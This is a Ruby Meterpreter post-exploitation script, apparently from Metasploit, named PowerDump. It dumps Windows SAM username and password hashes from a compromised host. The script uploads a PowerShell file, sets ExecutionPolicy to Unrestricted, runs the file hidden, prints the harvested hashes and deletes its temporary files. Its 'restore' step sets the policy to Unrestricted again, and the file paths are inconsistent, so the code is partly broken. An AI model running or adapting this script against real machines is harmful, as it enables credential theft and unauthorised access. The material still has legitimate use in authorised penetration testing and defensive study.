#
# Meterpreter script for utilizing purely PowerShell to extract username and password hashes through registry
# keys. This script requires you to be running as system in order to work properly. This has currently been
# tested on Server 2008 and Windows 7, which install PowerShell by default.
#
# Script and code written by: Kathy Peters, Joshua Kelley (winfang), and David Kennedy (rel1k)
#
# Special thanks to Carlos Perez for the template from GetCounterMeasures.rb
#
# Script version 0.0.1
#

session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ]
)

def usage
	print_line("PowerDump -- Dumping the SAM database through PowerShell")
	print_line("Dump username and password hashes on systems that have")
	print_line("PowerShell installed on the system. Win7 and 2008 tested.")
	print(@@exec_opts.usage)
	raise Rex::Script::Completed
end

#-------------------------------------------------------------------------------
# Actual Hashdump here

def dumphash(session)

	path = File.join( Msf::Config.install_root, "data", "exploits", "powershell" )

	print_status("Running PowerDump to extract Username and Password Hashes...")
	filename=("#{rand(100000)}.ps1")
	hash_dump=("#{rand(100000)}")
	session.fs.file.upload_file("%TEMP%\\#{filename}","#{path}/powerdump.ps1")
	print_status("Uploaded PowerDump as #{filename} to %TEMP%...")
	opmode = ""
	print_status("Setting ExecutionPolicy to Unrestricted...")
	session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", nil, {'Hidden' => 'true', 'Channelized' => true})
	print_status("Dumping the SAM database through PowerShell...")
	session.sys.process.execute("powershell C:\\Windows\\Temp\\#{filename} >> C:\\Windows\\Temp\\#{hash_dump}", nil, {'Hidden' => 'true', 'Channelized' => true})
	sleep(10)
	hashes=session.fs.file.new("%TEMP%\\#{hash_dump}", "rb")
	begin
		while ((data = hashes.read) != nil)
			data=data.strip
			print_line(data)
		end
	rescue EOFError
	ensure
		hashes.close
	end
	print_status("Setting Execution policy back to Restricted...")
	session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", nil, {'Hidden' => 'true', 'Channelized' => true})
	print_status("Cleaning up after ourselves...")
	session.sys.process.execute("cmd /c del %TEMP%\\#{filename}", nil, {'Hidden' => 'true', 'Channelized' => true})
	session.sys.process.execute("cmd /c del %TEMP%\\#{hash_dump}", nil, {'Hidden' => 'true', 'Channelized' => true})

end
print_status("PowerDump v0.1 - PowerDump to extract Username and Password Hashes...")
dumphash(session)
